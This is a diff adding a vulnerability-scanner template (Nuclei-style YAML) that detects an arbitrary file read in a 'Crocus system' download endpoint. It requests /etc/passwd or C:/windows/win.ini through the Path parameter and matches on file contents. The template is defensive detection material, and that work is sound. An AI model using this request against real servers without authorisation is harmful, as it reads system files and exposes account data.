@@ -1,0 +1,32 @@
+id: crocus-dzwnload-fileread
+info:
+  name: Crocus System Download Interface File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    This template detects a file read vulnerability in the Crocus system's download interface. It attempts to read sensitive files like `/etc/passwd` or `C:/windows/win.ini`.
+
+variables:
+  r_data_linux:
+    - "/etc/passwd"
+    - "C:/windows/win.ini"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/Service.do?Action=Download&Path={{r_data_linux}}"
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "bit app support"
+          - "fonts"
+          - "extensions"
+        part: body
+        condition: and
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+        part: body
